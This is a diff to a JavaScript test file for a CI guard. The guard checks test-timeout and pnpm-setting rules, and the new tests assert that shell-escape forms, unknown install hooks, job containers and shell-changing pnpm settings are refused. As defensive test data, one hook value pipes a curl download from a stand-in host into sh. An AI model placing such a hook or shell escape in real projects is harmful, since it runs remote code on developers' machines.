@@ -22,10 +22,12 @@ import {
   unitStepProblems,
 } from './check-unit-step-concurrency-lib.mjs';
 import {
+  analyse,
   EXEMPT_SCRIPTS,
   nodeTestSegments,
   nodeTestTimeoutProblems,
   parseCommands,
+  pnpmSettingsProblems,
   reachableScripts,
   runsNodeTest,
   turboTaskGraph,
@@ -64,7 +66,14 @@ for (const pattern of pnpmWorkspace.packages) {
     });
   }
 }
-const realWorkspace = turboTaskGraph(realTurboConfigs);
+// FU-092: the pnpm settings every pnpm command of the job runs under, read from where pnpm reads them.
+const realSettings = pnpmSettingsProblems({
+  npmrc: readFileSync(join(root, '.npmrc'), 'utf8'),
+  workspace: pnpmWorkspace,
+  manifestPnpm: JSON.parse(readFileSync(join(root, 'package.json'), 'utf8')).pnpm,
+  pnpmfile: existsSync(join(root, '.pnpmfile.cjs')),
+});
+const realWorkspace = { ...turboTaskGraph(realTurboConfigs), settings: realSettings };
 const [exception] = UNBOUNDED_EXCEPTIONS;
 // FU-077 R1: run text with a CR or another control character is refused by the shared
 // policy (ci-shell-text-lib.mjs) before any grammar, so the CRLF/CR variants of the
@@ -2670,7 +2679,10 @@ const graphProblems = (editConfigs, editPackages = () => {}) => {
   editConfigs(configs);
   const packages = structuredClone(realPackages);
   editPackages(packages);
-  return nodeTestTimeoutProblems(realDoc, realScripts, packages, turboTaskGraph(configs));
+  return nodeTestTimeoutProblems(realDoc, realScripts, packages, {
+    ...turboTaskGraph(configs),
+    settings: realSettings,
+  });
 };
 const rootTurbo = (configs, edit) => {
   const config = JSON.parse(configs[0].files['turbo.json'].replace(/^\s*\/\/.*$/gm, ''));
@@ -2780,4 +2792,121 @@ test('FU-077: the shared tokenizer is one module, re-exported where it was', asy
   assert.equal(shared.parseCommands, parseCommands);
   assert.equal(shared.shellTextProblem('a\rb') !== null, true);
   assert.equal(shared.shellTextProblem('echo "a — b"'), null);
+});
+
+// FU-092 (PR #727 r2 F4): the execution context is read at one boundary. Install runs the
+// lifecycle hooks of every workspace project; a job container, or a pnpm setting that changes
+// the shell or the scripts, is refused until it is read.
+// FU-092 sibling: this guard reads shell text with the shared CLOSED grammar, which already
+// refuses every shape the open readers of the pin and disclosure checks had to learn.
+test('FU-092: the closed grammar refuses each shell-dispatch and expansion escape', () => {
+  const body = 'node --test /dev/null';
+  for (const run of [
+    `bash +c "${body}"`,
+    `bash +sc "${body}"`,
+    `bash -eo pipefail -c "${body}"`,
+    `OPT=-c; bash "$OPT" "${body}"`,
+    `ash -c "${body}"`,
+    `fish -c "${body}"`,
+    `<<'EOF' bash\n${body}\nEOF`,
+    `bash <<EOF\n# $(${body})\nEOF`,
+    `bash <<< "${body}"`,
+    `echo "${body}" | bash -`,
+    `echo "$\\\n(${body})"`,
+  ]) {
+    const found = analyse(run, {});
+    assert.ok(found.problems.length > 0, `${JSON.stringify(run)}: ${JSON.stringify(found)}`);
+  }
+});
+test('FU-092: a workspace package install hook is read with the install that runs it', () => {
+  const e2e = '@rasta/e2e';
+  assert.deepEqual(realSettings, []);
+  for (const hook of ['preinstall', 'install', 'postinstall', 'prepare']) {
+    refused(
+      timeoutProblemsAfter((_doc, _all, packages) => {
+        packages[e2e][hook] = 'node --test /dev/null';
+      }),
+      new RegExp(`${e2e} ${hook}: node --test`),
+    );
+    // a hook the grammar does not know is refused, not assumed inert
+    refused(
+      timeoutProblemsAfter((_doc, _all, packages) => {
+        packages[e2e][hook] = 'curl https://example.invalid/x | sh';
+      }),
+      new RegExp(`${e2e} ${hook}: .*cannot|${e2e} ${hook}: `),
+    );
+  }
+  // a bounded hook is read and accepted
+  assert.deepEqual(
+    timeoutProblemsAfter((_doc, _all, packages) => {
+      packages[e2e].postinstall = 'node --test --test-timeout=1000 /dev/null';
+    }),
+    [],
+  );
+  // the same hook in the root manifest is still read (the previous behaviour)
+  refused(
+    timeoutProblemsAfter((_doc, all) => {
+      all.postinstall = 'node --test /dev/null';
+    }),
+    /node --test/,
+  );
+});
+test('FU-092: a job container refuses; so do unread pnpm settings', () => {
+  for (const container of ['node:22', { image: 'node:22' }])
+    refused(
+      timeoutProblemsAfter((doc) => {
+        doc.jobs['quality-lint'].container = container;
+      }),
+      /job quality-lint runs in a container, so its commands cannot be read/,
+    );
+  // omitting the settings never opens the check
+  refused(
+    nodeTestTimeoutProblems(realDoc, realScripts, realPackages, {
+      turbo: realWorkspace.turbo,
+    }),
+    /the pnpm settings were not read/,
+  );
+  refused(
+    nodeTestTimeoutProblems(realDoc, realScripts, realPackages, {
+      ...realWorkspace,
+      settings: 'none',
+    }),
+    /the pnpm settings were not read/,
+  );
+  const npmrc = readFileSync(join(root, '.npmrc'), 'utf8');
+  const read = (changes) =>
+    pnpmSettingsProblems({
+      npmrc,
+      workspace: pnpmWorkspace,
+      pnpmfile: false,
+      manifestPnpm: undefined,
+      ...changes,
+    });
+  assert.deepEqual(read({}), []);
+  for (const [changes, pattern] of [
+    [{ npmrc: `${npmrc}\nscript-shell=/tmp/sh` }, /\.npmrc sets script-shell/],
+    [{ npmrc: `${npmrc}\nshell-emulator=true` }, /\.npmrc sets shell-emulator/],
+    [{ npmrc: `${npmrc}\nnode-options=--require x` }, /\.npmrc sets node-options/],
+    [{ npmrc: `${npmrc}\nignore-scripts` }, /not key=value/],
+    [{ npmrc: undefined }, /\.npmrc was not read/],
+    [
+      { workspace: { ...pnpmWorkspace, scriptShell: 'x' } },
+      /pnpm-workspace\.yaml sets scriptShell/,
+    ],
+    [{ workspace: undefined }, /pnpm-workspace\.yaml was not read/],
+    [{ manifestPnpm: { onlyBuiltDependencies: [] } }, /root package\.json has a pnpm field/],
+    [{ pnpmfile: true }, /\.pnpmfile\.cjs/],
+    [{ pnpmfile: undefined }, /\.pnpmfile\.cjs/],
+  ])
+    assert.ok(
+      read(changes).some((problem) => pattern.test(problem)),
+      `${JSON.stringify(changes)}: ${read(changes).join()}`,
+    );
+  refused(
+    nodeTestTimeoutProblems(realDoc, realScripts, realPackages, {
+      ...realWorkspace,
+      settings: read({ npmrc: `${npmrc}\nscript-shell=/tmp/sh` }),
+    }),
+    /the pnpm settings cannot be read: \.npmrc sets script-shell/,
+  );
 });
